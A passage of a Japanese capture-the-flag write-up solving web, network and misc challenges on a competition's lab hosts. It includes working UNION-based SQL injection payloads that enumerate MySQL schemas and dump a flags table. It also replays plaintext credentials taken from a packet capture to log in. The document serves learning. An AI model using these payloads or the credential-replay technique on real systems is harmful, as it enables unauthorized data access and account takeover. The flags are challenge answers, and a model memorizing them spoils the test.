User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://frog-works-collection.siebold-cyber.net/
Accept-Encoding: gzip, deflate, br
Accept-Language: ja,en-US;q=0.9,en;q=0.8,ko;q=0.7
Cookie: user=guest

contents=1980s%2FThe+flag+hiding
```

```http
HTTP/1.1 200 OK
Server: nginx
Date: Tue, 20 Dec 2022 14:07:26 GMT
Content-Type: text/html; charset=UTF-8
Content-Length: 2684
Connection: keep-alive
Vary: Accept-Encoding


<html>
    <head>
        <meta charset="UTF-8">
        <meta name="robots" content="noindex">
        <link rel="stylesheet" href="stylesheet.css">
        <title>Frog works collection</title>
    </head>
    <body>
        <h1>Frog works collection</h1>
        <p>welcome, guest user!</p>
        <p>I love frogs!<br>So I have collected a collection of frog works.</p>
        <table>
            <tr><th>year of publication</th><th>title</th></tr>
            <tr><td>1940s</td><td>The frog king or Iron Henry</td></tr>
            <tr><td>1950s</td><td>A frog</td></tr>
            <tr><td>1970s</td><td>A snake and a frog</td></tr>
            <tr><td></td><td>Frogs</td></tr>
            <tr><td></td><td>Char eating frogs</td></tr>
            <tr><td>1980s</td><td>Two frogs</td></tr>
            <tr><td></td><td>The flag hiding</td></tr>
            <tr><td></td><td>First time frog</td></tr>
            <tr><td>1990s</td><td>the croaking of frogs</td></tr>
            <tr><td>2000s</td><td>The story of a learned frog</td></tr>
        </table>
        <p>The works that guest users have access to are as follows.</p>
        <form id='form' method='POST'>
            <select name="contents">
                <option value='1940s/The frog king or Iron Henry'>1940s: The frog king or Iron Henry</option><option value='1950s/A frog'>1950s: A frog</option><option value='1970s/A snake and a frog'>1970s: A snake and a frog</option><option value='1970s/Frogs'>1970s: Frogs</option><option value='1970s/Char eating frogs'>1970s: Char eating frogs</option>            </select>
            <input type='submit' value='select'>
        </form>
        <p></p>
        <div id='contents'>
            <h1 class="title">旗隠し</h1>
<h2 class="author">NISM</h2>
<div>旗はどこだろう。<br>旗はどこだろう。<br>見えているものがすべてではない。</div>
<div id='hldden'>君には何が見えている？<br><br></div>
<div>旗はどこだろう。<br>旗はどこだろう。<br>でも確かにそこに存在する。</div>
<div id='hidden'><br></div>
<div>旗はどこだろう。<br>旗はどこだろう。<br>ほら、もう見つけたかい？</div>        </div>
    </body>
    <footer>
        This site contains works whose copyrights have expired, taken from the Aozora Bunko (https://www.aozora.gr.jp/). NISM does not claim copyright on these works.<br>
        These works may also contain expressions that might be perceived as inappropriate today, but we will publish them in their original form with a statement to that effect here.
        <p>copyright (c) NISM</p>
</footer>
</html>
```

「見えているものがすべてではない。」などと書かれているが、このレスポンスにはフラグが無い。

よく見ると、非表示になっている箇所のid属性が`hidden`と`hldden`の2種類ある。

CSSの指定で、誤字のような`hldden`が定義されているようなので、スタイルシートを見に行く。

```http
GET https://frog-works-collection.siebold-cyber.net/stylesheet.css HTTP/1.1
Host: frog-works-collection.siebold-cyber.net
Connection: keep-alive
Pragma: no-cache
Cache-Control: no-cache
sec-ch-ua: "Not?A_Brand";v="8", "Chromium";v="108", "Google Chrome";v="108"
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36
sec-ch-ua-platform: "Windows"
Accept: text/css,*/*;q=0.1
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: no-cors
Sec-Fetch-Dest: style
Referer: https://frog-works-collection.siebold-cyber.net/
Accept-Encoding: gzip, deflate, br
Accept-Language: ja,en-US;q=0.9,en;q=0.8,ko;q=0.7
Cookie: user=guest

```

```http
HTTP/1.1 200 OK
Server: nginx
Date: Tue, 20 Dec 2022 14:09:34 GMT
Content-Type: text/css
Content-Length: 555
Connection: keep-alive
Last-Modified: Sat, 17 Dec 2022 04:34:21 GMT
ETag: "22b-5effe999fee40-gzip"
Accept-Ranges: bytes
Vary: Accept-Encoding

html {
  background: #d1f0e2;
}

h1, p {
text-align: center;
}

table {
  margin:auto;
}

th, td {
  border: 1px solid rgb(50, 100, 45);
}

#form {
margin-bottom: 5%;
text-align: center;
}

#contents {
width: 80%;
margin-top: 5%;
margin-right: auto;
margin-left: auto;
padding: 2%;
background-color: white;
}

#hldden {
  color:#ffffff;
}

#hidden {
  color:#ffffff;
}

#hidden:after {
  content: "NISM{Why_c4n_y0u_C_m3!?}";
}

footer {
margin-top: 3%;
padding: 2%;
color: white;
background-color: #02b171;
}
```

CSS内に書かれているフラグが正解。

#### お米食べろ
> 近年はお米の消費量が落ち込んでいる、と言われますが、やっぱり毎日一番食べているのはお米ですよね！2010年から2020年までの全国の水陸稲作付面積の統計データを集めました。

サイトにアクセスすると入力欄１つと検索ボタンが表示される。

とりあえずUNIONしてみる。
```
query=%27union+select+1+from+dual%23
```
エラーが出て、どうもカラム数があっていない模様。
```
Fatal error: Uncaught mysqli_sql_exception: The used SELECT statements have a different number of columns in /var/www/html/index.php:29 Stack trace: #0 /var/www/html/index.php(29): mysqli_query() #1 {main} thrown in /var/www/html/index.php on line 29
```
カラム数を３つにしてみると、エラーが出なくなる。
```
'union select 1,2,3 from dual#
```

雑にテーブル名を一覧表示してみる
```
ほげ' UNION SELECT TABLE_SCHEMA,2,3 from INFORMATION_SCHEMA.COLUMNS#
```

存在するスキーマが3つあることが分かる。
- information_schema
- rice
- flags

flagsスキーマがいかにも怪しいので、ここに存在するテーブルを調べる。

```
ほげ' UNION SELECT group_concat(TABLE_NAME),2,3 from INFORMATION_SCHEMA.COLUMNS where TABLE_SCHEMA = 'flags'#
```

既定路線的にflagsテーブルがあることが分かる。

続けてカラム名を確認する。

```
ほげ' UNION SELECT group_concat(COLUMN_NAME),2,3 FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = 'flags' #
```

カラムはidとflagの2つである。

flagスキーマのflagsテーブルを全件SELECTし、カラム数を３つにして返す。

```http
POST https://inasaku-toukei.siebold-cyber.net/index.php HTTP/1.1
Host: inasaku-toukei.siebold-cyber.net
Connection: keep-alive
Content-Length: 74
Cache-Control: max-age=0
sec-ch-ua: "Not?A_Brand";v="8", "Chromium";v="108", "Google Chrome";v="108"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
Origin: https://inasaku-toukei.siebold-cyber.net
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://inasaku-toukei.siebold-cyber.net/index.php
Accept-Encoding: gzip, deflate, br
Accept-Language: ja,en-US;q=0.9,en;q=0.8,ko;q=0.7

query=%E3%81%BB%E3%81%92%27+UNION+SELECT+id%2Cflag%2C3+FROM+flags.flags%23
```

```http
HTTP/1.1 200 OK
Server: nginx
Date: Tue, 20 Dec 2022 14:20:44 GMT
Content-Type: text/html; charset=UTF-8
Content-Length: 3592
Connection: keep-alive
Vary: Accept-Encoding

<!DOCTYPE html>
<html lang="ja">
    <head>
        <meta charset="UTF-8">
        <meta name="robots" content="noindex">
        <link rel="stylesheet" href="stylesheet.css">
        <title>水陸稲作付面積統計</title>
    </head>
    <body>
        <h1>年次別全国都道府県別水陸稲作付面積統計</h1>
                <form id="form" method="POST" action="index.php">
            <input type="text" name="query" value="ほげ' UNION SELECT id,flag,3 FROM flags.flags#">
            <input id="sbmt" type="submit" value="検索">
        <p>
            西暦と都道府県名で検索できます。
        </p>
        </form>
        <table><tr><th>年</th><th>都道府県名</th><th>作付面積(ha)</th></tr><tr><th>1</th><td>IMNS{aICFQ^CgFOM9aIOPDy_wcT1V_tY~_[NVt~dO&lt;mIcp@GgDihoZ@Z4@.}</td><td>3</td></tr><tr><th>2</th><td>IMSN{kzS77T8BHqR@amHyaYCWw^m6kBS/3(=A4m6BS~O~LD~FkH=hcT^[u]&gt;2BU0.}</td><td>3</td></tr><tr><th>3</th><td>INMS{@!Q))_pHEGKm5_Sm5lugzM5GudbL-8[dmr7OCKMe=8)_nooksnt^~^c0BsidDV@GG.}</td><td>3</td></tr><tr><th>4</th><td>INSM{70fB@2bL1De]jhPrk(fQHW!EI)wTRvhes@gf4agUx)^dTWORb0IZ8jIExsm2xq=.}</td><td>3</td></tr><tr><th>5</th><td>ISMN{2&lt;~&lt;M2yWvyS_5&lt;(2a@n9zaNHBu(lAEAW9@@mT)VNaTKf^Zk6LWdVF9&lt;.}</td><td>3</td></tr><tr><th>6</th><td>ISNM{l7BO&gt;&lt;zz5pX7j4630BksQGnA^wp6&lt;d)g80/zHJfJ2ZnVK7C9aP~_tD50Gf5h!Et.}</td><td>3</td></tr><tr><th>7</th><td>MINS{!zIzb5O1Sdd]f-fhTqWJk9(hCSk4vC5Y6vmV_j51&gt;Y^-Fi1sjf1RwoC.}</td><td>3</td></tr><tr><th>8</th><td>MISN{3U3/v1=WsPIG^odYfr~Wf=DCiYi)wbch@(TOC2Kbl(D(s8JJJ)&lt;3.}</td><td>3</td></tr><tr><th>9</th><td>MNIS{R6aO[rdI!4)Etez=Kt1yQ6J2^KaReJWzvxpRgajm-@91H_dvn[.}</td><td>3</td></tr><tr><th>10</th><td>MNSI{@^Z9DkqlUfC/s!@rEs&lt;-be0Ta4)gRvl[CnqXHO3DlC[P@A_ay3ok5rqpP2pn!Ip.}</td><td>3</td></tr><tr><th>11</th><td>MSIN{OiXy0aB4&gt;J(eL7A]YucEYa^]i&lt;uEGcLLb!m2Vy=70Ukcg~i3B0MSb_.}</td><td>3</td></tr><tr><th>12</th><td>MSNI{Xy3)s!5Bx6=FSDAHB=-tl)w(D7!8@ZN6b92^kKYqTW@H(a7vFfCjei)RcEJB[].}</td><td>3</td></tr><tr><th>13</th><td>NIMS{qo]klrbnFIUq5T1Eq9NPgyFw~Oo/ESwpV=PCB9=K_d^EU6J4e5(d&lt;FdU.}</td><td>3</td></tr><tr><th>14</th><td>NISM{wh3r3_m3t4d4t4_1s_loca7ed_d3p3ndz_on_7he_7ype_of_d@t@b@se.}</td><td>3</td></tr><tr><th>15</th><td>NMIS{_iHB]yobv9MW1i4nGrV)Mq8vuL1ND!qz)l5)Tgc9gz&gt;&gt;E(B32Av]t9cQmWHn&lt;k.}</td><td>3</td></tr><tr><th>16</th><td>NMSI{O3NHXpGpEzfQp~edo7)aj!9r^/W3bejeD&lt;QuIxqbDg[g[SK/HpdGjSpO5.}</td><td>3</td></tr><tr><th>17</th><td>NSIM{mXN/KZlJ7B=Xu6^Usovv^H=78bp~h^5x2Ej39rG5(hy_^u]e6Yve@nY3ASr~/LVQ.}</td><td>3</td></tr><tr><th>18</th><td>NSMI{n[HlX6bqUdcIZgMu@Bu=IHkZkf!6kpYDQ92IB@cLN2b5Ed^vxK.}</td><td>3</td></tr><tr><th>19</th><td>SIMN{Bst9[gXfjDvg535&gt;LV5/hI@vd4h42mHPeSC4Mw05f_SiPH]C0]J30qt0I=WIgYcWV.}</td><td>3</td></tr><tr><th>20</th><td>SINM{yFlLAE!nbVol)^SOv&gt;dj[EDh6=n(W6gRUs&lt;8dOjtT69piF2b@v/KTc8VZ.}</td><td>3</td></tr><tr><th>21</th><td>SMIN{8ZI8)yGO&gt;Qyr6&lt;t]s6=KMnn7cbifC0M/3]4]d@ua9Mtrr0Z^]tSlamfB=uKL_a]L.}</td><td>3</td></tr><tr><th>22</th><td>SMNI{jOxqC45Aed2o)Wj5u(^2rd_()X3J^BCF7YG01yfnFics/^UI/R5Cskn.}</td><td>3</td></tr><tr><th>23</th><td>SNIM{f6Yr3seLw-sf@KJ)E(XdutK)L2yo6Rj(41h^xY(9M=uUw&gt;oWzCo&lt;W1s=.}</td><td>3</td></tr><tr><th>24</th><td>SNMI{6tXjSTMdSW0D2dsU&lt;s[~hO^/!J)_oL!mswV2KM9B7JtB[nL8V~pp^gQX~-Xc.}</td><td>3</td></tr></table>    </body>
    <footer>
        <p>
            年次別全国都道府県別水陸稲作付面積統計<br>
            出典：農林水産省 https://www.maff.go.jp/j/tokei/kouhyou/sakumotu/sakkyou_kome/#r
        </p>
    </footer>
</html>
```

１つだけ`NISM{}`形式に合致するフラグがあるので回答して正解。

### NW

#### Electrical talk
> あなたは、社内ネットワークに接続されている無数のコンピュータの中から、唯一通信できるコンピュータ1台を発見するネットワーク宝探しゲームに参加しています。
>様々なIPアドレスへ通信確認をしているpcapと、そのIPとのホスト名対応表を用いて、通信可能なコンピュータのホスト名を答えよ。
> 回答の際は、次の形式で答えること。ただし、ホスト名には、ホスト名対応表の任意のホスト名が入る。 NISM{[ホスト名]}

与えられたp1.pcapをWiresharkで開く。

よくわからないまま眺めていると、Destination 192.168.200.98のものだけ何やら表示が異なる。
Echo（ping）に成功しているようなので、このIPを一覧から探す。

> 192.168.200.98	tHekLRUU3dRMH5kJ5Q

これをフラグ形式にして回答。
> NISM{tHekLRUU3dRMH5kJ5Q}

#### Insecure communications

> ネットワークの勉強の一環で、親友の同意のもと、親友のネットワークを数分キャプチャさせていただいた。
> どうやら、親友はある会員向けのHTTPサイトにアクセスし、会員限定記事を見ているようだ。
> 僕も見たい。そこには魔法のflagが隠されているみたいだ、、、
> 与えられたpcapより、会員向けサイトのクレデンシャルを見つけ出し、実際にアクセスして自分の目でflagを確認してみよう。

与えられたp2.pcapをWiresharkで開く。

HTTPサイトにアクセスして会員限定云々と書いているので、認証してそうな通信を探す。

追跡でHTTPストリームを眺めて`/cgi-bin/mail-maga-auth.py`という怪しいパスを見つける。
リクエストボディに書かれているID,PWでアクセスするもエラー。

改めてHTTPストリームを見ると、同じ宛先に何度も認証試行している。
最後に使用されたクレデンシャルを使ってログインし、フラグを得る。

```http
POST /cgi-bin/mail-maga-auth.py HTTP/1.1
Host: electronic.tuda-organization.siebold-cyber.net
Connection: keep-alive
Content-Length: 42
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
Origin: http://electronic.tuda-organization.siebold-cyber.net
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://electronic.tuda-organization.siebold-cyber.net/magazine.html
Accept-Encoding: gzip, deflate
Accept-Language: ja,en-US;q=0.9,en;q=0.8

unam=mu05201914&pwrd=zaCra-a4a_l9%40kU3-8g
```

```http
HTTP/1.1 200 Script output follows
Server: nginx
Date: Tue, 20 Dec 2022 14:30:47 GMT
Content-Type: text/html; charset=UTF-8
Connection: keep-alive
Content-Length: 433


    <!DOCTYPE html>
    <html lang="ja">
    <head>
        <meta charset="UTF-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">

        <title>メールマガジン - 津田社電子</title>
    </head>
    <body>

        Flag : NISM{like_a_magic_highway_and_network_is_deep_but_fun}

    </body>
    </html>
```

#### Where am I?
> ネットワークを学習する上で避けては通れないサブネットマスクの計算。
> 力試しでやってみましょう。
> 192.168.1.0/28のネットワークにおいて、192.168.1.93のネットワークアドレスを答えなさい。
> なお、解答の際はNISM{[IPアドレス]}の形式で答えること。
> 例：回答が192.168.250.34なら、回答はNISM{192.168.250.34}となる。

https://note.cman.jp/network/subnetmask.cgi で検索してみる。

検索条件
> IPアドレス：192.168.1.93
> サブネットマスク：/28

検索結果
> IPアドレス	192.168.1.93
> サブネットマスク	/28 (255.255.255.240)
> ネットワークアドレス(開始IP)	192.168.1.80
> ホストアドレス(使用可能IP)	192.168.1.81～192.168.1.94
> ブロードキャストアドレス(終了IP)	192.168.1.95
> アドレス数	IPアドレス数：16 （ホストアドレス数：14）
> IPアドレスクラス	クラスC

フラグ形式に合わせて回答する。
NISM{192.168.1.80}

### Misc
#### カラーコード
> NISMのロゴマークに使われている青色は、RGB形式で表すと、rgb(0,153,204)です。この色のカラーコードを答えてください。flagは、NISM{#xxxxxx}の形式で答えてください。

153は16進数で99、204は16進数でCC。
フラグ形式にして回答する。

> NISM{0099CC}

#### 奇妙な文字列
> こんな意味不明な文字列が友達から送られてきたんだけど、君は解読できるかい？
>TklTTXtiQHNlNjRfYzRuX2IzX2VhNWkxeV9kZWMwZGVkfQ==

末尾に`==`が付いておりBase64ぽいのでデコードしてみる。

Chrome DevToolsのコンソールを使ってみる。

> > atob("TklTTXtiQHNlNjRfYzRuX2IzX2VhNWkxeV9kZWMwZGVkfQ==")
> < 'NISM{b@se64_c4n_b3_ea5i1y_dec0ded}'

そのまま回答して正解。

### Welcome
#### When is Christmas ?

> 今年も、皆が待ち望むクリスマスがやってくる。クリスマスは、おいしいケーキにおいしいオードブル。考えるだけでお腹が空いてきますね。
> さて、今年のクリスマスはいつでしたっけ？yyyy_mm_ddで答えてください。
> flagはNISM{[半角英数字記号]}の形式です。
> 今年のクリスマスは、2022_12_25ですので、本問のflagはNISM{2022_12_25}となります。
> ＊flagは、NISM{2022_12_25}です。＊

指定通りに回答する。

### アンケート

> NISM{2022_is_gone_and_2023_is_coming}

